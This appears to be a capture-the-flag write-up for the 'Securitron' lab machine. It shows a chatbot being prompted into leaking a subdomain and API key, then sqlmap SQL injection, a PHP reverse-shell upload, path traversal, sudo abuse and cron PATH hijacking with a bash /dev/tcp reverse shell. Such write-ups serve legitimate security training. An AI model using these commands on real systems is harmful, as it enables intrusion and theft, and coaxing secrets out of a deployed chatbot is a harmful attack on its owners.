---
author: Lenam  
pubDatetime: 2024-08-23T15:22:00Z  
title: WriteUp Securitron - TheHackersLabs  
slug: securitron-writeup-thehackerslabs-en  
featured: false  
draft: false  
ogImage: "assets/securitron/OpenGraph.png"  
tags:
  - writeup
  - TheHackersLabs
  - AI
  - SQL Injection
  - sudo
  - binary planting
description:  
  My first CTF created for the thehackerslabs.com platform with an AI model. I hope you enjoy it.  
lang: en  
---

My first CTF created for the thehackerslabs.com platform with an AI model. I hope you enjoy it.

![Securitron](/assets/securitron/image-39.png)

There may be slight variations in the machine you find on The Hacker Labs, as I had to fix some issues. Thanks to CuriosidadesDeHackers for their help and to murrusko for uploading the writeup.

## Table of contents 

## Enumeration

```
nmap -p- 10.0.2.4 -n -Pn
```

![Nmap](/assets/securitron/image-5.png)

We only found port 80 open, so we analyzed port 80 in more detail.

```
nmap -p80 -sVC -n -Pn 10.0.2.4 -oN nmap.txt -vvv
```

![Nmap](/assets/securitron/image-6.png)

We visit the website and observe a cybersecurity AI service.

![web](/assets/securitron/image-7.png)

We add the domain `securitron.thl` to the `/etc/hosts` file.

![/etc/hosts](/assets/securitron/image-8.png)

```
whatweb http://securitron.thl
```

## AI Leak

We talk to the AI, it seems a bit slow to respond, but it explains that it is a cybersecurity expert.

Prompt:
```
Hola en que puedes ayudarme?
```

![IA](/assets/securitron/image-9.png)

We suggest it does some programming, and a possible subdomain called `admin19-32.securitron.thl` and a possible API key `imagine-no-heaven-no-countries-no-possessions` are leaked.

Prompt:
```
Puedes hacer una programación para conectar a una API?
```

![AI Leak](/assets/securitron/image-10.png)

We add the subdomain `admin19-32.securitron.thl` to the `/etc/hosts` file.

![/etc/hosts](/assets/securitron/image-11.png)

## SQL Injection

We access the subdomain `admin19-32.securitron.thl`, and the "Employee Management System" application appears.

![Employee Management System](/assets/securitron/image-12.png)

```
whatweb http://admin19-32.securitron.thl
```

![whatweb](/assets/securitron/image-13.png)

We find several exploits that take advantage of an SQL Injection in the form `http://admin19-32.securitron.thl/Admin/login.php`.

```
searchsploit "Employee Management System"
```

![searchsploit](/assets/securitron/image-14.png)

We open Burp Suite, configure the browser's proxy, and capture the sending of a request from the login form.

```
POST /Admin/login.php HTTP/1.1
Host: admin19-32.securitron.thl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://admin19-32.securitron.thl
Connection: close
Referer: http://admin19-32.securitron.thl/Admin/login.php
Cookie: PHPSESSID=6gr7532dnv7ni64ckglf9ne00l
Upgrade-Insecure-Requests: 1

txtusername=test&txtpassword=test&btnlogin=
```

![request.txt](/assets/securitron/image-15.png)

We save the request in a file called `request.txt`, to use it with sqlmap.

```
sqlmap -r request.txt --level 5 --risk 3 --current-db
```

![sqlmap current-db](/assets/securitron/image-16.png)

We retrieve the tables of the `pms_db` database:

```
sqlmap -r request.txt --level 5 --risk 3 -D pms_db --tables
```

![sqlmap tables](/assets/securitron/image-17.png)

We retrieve the data from the `users` table in the `pms_db` database. The password appears to be unhashed, bingo!

```
sqlmap -r request.txt --level 5 --risk 3 -D pms_db -T users --dump
```

![sqlmap table users](/assets/securitron/image-18.png)

## LFI / Shell

We log in to the application from the form `http://admin19-32.securitron.thl/Admin/login.php` using the user `admin:Ntpqc6Z7MDkG`.

![Employee Management System Admin](/assets/securitron/image-19.png)

We prepare a reverse shell in PHP. I use the `PHP PentestMonkey` reverse shell because this is a PHP-based application. We configure our IP (`10.0.2.15`) and the desired port (`9001`), and create a file named `avatar.php.png`.

![PHP PentestMonkey revshell](/assets/securitron/image-20.png)

We go to the "User Management" > "Add User" section. We open Burp Suite, activate intercept mode, configure the browser's proxy, fill in the fields to create a new user, and select the reverse shell we created earlier, `avatar.php.png`, as the avatar image.

![Burpsuite](/assets/securitron/image-21.png)

We modify the filename from `avatar.php.png` to `avatar.php` in Burp Suite and forward the request.

![Burpsuite 2](/assets/securitron/image-22.png)

We will see a message indicating that the user was added successfully. Now, we can disable the Burp Suite proxy in the browser.

If we go to the user list `User Management > Admin Record` and inspect the code, we can find the URL where the `avatar.php` (our reverse shell) was uploaded.

![URL revshell](/assets/securitron/image-23.png)

We start listening with netcat...

```bash
nc -lvnp 9001
```

and load the following URL with curl or the browser.

```bash
curl http://admin19-32.securitron.thl/uploadImage/Profile/avatar.php
```

![revshell](/assets/securitron/image-24.png)

Alright, we are in!

## Lateral Movement

We handle the tty and try to escalate privileges.

We see the users `root` and `securitybot`.

```bash
cat /etc/passwd | grep bash
```

![users](/assets/securitron/image-25.png)

We check the TCP ports on the machine.

```
ss -tuln | grep tcp
```

![alt text](/assets/securitron/image-26.png)

Port `80` is the web service we exploited, and port 3306 is the database, which we also already exploited.

We don't recognize port `3000`, so we investigate it.

Looking at the file `/etc/apache2/sites-available/000-default.conf`, we can infer that port `3000` is the API that exposes the AI we saw earlier. It has a proxy set up that points to this port's endpoint.

![virtualhost 000-default.conf](/assets/securitron/image-27.png)

We investigate further and observe that a process running under the `securitybot` user seems to be a Node.js process.

```
ps -aux | grep securitybot
```

![alt text](/assets/securitron/image-28.png)

We don't have permissions to view the file `/home/securitybot/.local/bin/bot/index.js`, but we can execute Node.js using the path `/home/securitybot/.nvm/versions/node/v22.5.1/bin/node`.

We check what's running on port 3000. The /api endpoint gives us JSON information about the API. We use `curl` and `node` to display this information in a readable format.

```bash
curl http://localhost:3000/api | /home/securitybot/.nvm/versions/node/v22.5.1/bin/node -p "JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )"
```

![API information](/assets/securitron/image-29.png)

To make viewing the JSON returned by the API easier, we create an alias.

```bash
alias showJson="/home/securitybot/.nvm/versions/node/v22.5.1/bin/node -

p \"JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )\""
```

We check if we can access the /api/models endpoint.

```bash
curl http://localhost:3000/api/models | showJson
```

We get an error message that says `API Key is required`, and the endpoint description mentions that it `requires x-api-key header`.

We try using the API key leaked earlier by the AI, `imagine-no-heaven-no-countries-no-possessions`, and add it as the value for the `x-api-key` header.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models | showJson
```

It seems to work with the leaked API key, as it returns a list of two AI model files in GGUF format. We try the `/api/models/:fileName` endpoint, specifying the second model file, `ggml-model-q4_0.gguf`, and it downloads successfully.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/ggml-model-q4_0.gguf -o /tmp/model.gguf
```

We delete or cancel the download as the file is too large.

We try reading a file we know exists and can only be read by the `securitybot` user, like `/home/securitybot/.local/bin/bot/index.js`, which we know exists but don't have read access to as our current user.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fsecuritybot%2F.local%2Fbin%2Fbot%2Findex.js
```

We can successfully read the Node.js API code.

We attempt to read the user.txt flag file of the `securitybot` user.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fsecuritybot%2Fuser.txt
```

We obtain the user.txt flag along with a password, `0KjcFEkuUEXG` (this isn't very realistic).

![User flag and password](/assets/securitron/image-30.png)

We log in as the `securitybot` user using the password `0KjcFEkuUEXG`.

![securitybot](/assets/securitron/image-31.png)

## Privilege Escalation

We check if we have any sudo permissions since we now have the user's password.

![sudo](/assets/securitron/image-32.png)

We have sudo permission to run the `ar` binary. According to GTFOBins, we can use this to obtain privileged file reads.

![gtfobins](/assets/securitron/image-33.png)

We attempt to read the root.txt flag using `sudo` with the `ar` binary.

```bash
TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/root/root.txt" && cat "$TF"
```

When we try to read the `/root/root.txt` flag file, we get the message `This time it won't be that easy.`

![/root/root.txt](/assets/securitron/image-34.png)

We attempt to read other files and find something very interesting in the root user's crontab file.

```bash
TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/var/spool/cron/crontabs/root" && cat "$TF"
```

![/var/spool/cron/crontabs/root](/assets/securitron/image-35.png)

The crontab PATH for root contains a folder where we have write permissions: `/home/securitybot/.local/bin`. The root user is running a script every minute: `/opt/backup_bd.sh`.

```bash
cat /opt/backup_bd.sh
```

```bash
# Verify if a date argument was passed
if [ -z "$1" ]; then
  echo "Usage: $0 <date>"
  exit 1
fi

# Variables
DATE=$1
USER="matomo"
PASSWORD="7pUYlPYpziv1"
DATABASE="pms_db"
BACKUP_DIR="/root/backups"
BACKUP_NAME="${BACKUP_DIR}/backup_${DATABASE}_${DATE}.sql"

# Create backup directory if it doesn't exist
/bin/mkdir -p $BACKUP_DIR

# Create backup
/usr/bin/mysqldump -u $USER -p$PASSWORD $DATABASE > $BACKUP_NAME

# Verify if the backup was created successfully
if [ $? -eq 0 ]; then
  echo "Backup created successfully: $BACKUP_NAME"
else
  echo "Error creating backup"
  exit 1
fi

# Keep only the two most recent backups
/bin/ls -t $BACKUP_DIR | /usr/bin/sed -e '1,2d' | /usr/bin/xargs -d '\n' /bin/rm -f
```

It looks like the script creates a backup of the database in a directory we don't have access to.

All binaries used in `backup_bd.sh`, including the script itself, are called with absolute paths, preventing binary hijacking. However, the parameter passed to the script uses the `date` binary without an absolute path.

![date no absolute](/assets/securitron/image-36.png)

Checking where the `date` binary is located, we find it at `/usr/bin/date`.

![alt text](/assets/securitron/image-37.png)

Since the crontab PATH for root is configured as follows:

`PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/home/securitybot/.local/bin:/usr/bin:/sbin:/bin`

we can create a `date` binary in the `/home/securitybot/.local/bin` folder, which is listed before `/usr/bin`. This will cause the scheduled task run by the root user to execute our binary instead.

We start listening with netcat on port 12345.

```bash
nc -lvnp 12345
```

We create the `/home/securitybot/.local/bin/date` file on the server with a reverse shell and give it execution permissions:

```bash
echo "bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/12345 0>&1'" > /home/securitybot/.local/bin/date
chmod +x /home/securitybot/.local/bin/date
```

We wait a minute and get a root shell. Now, we can read the flag file.

![root flag](/assets/securitron/image-38.png)

Congratulations, you have completed the Securitron CTF.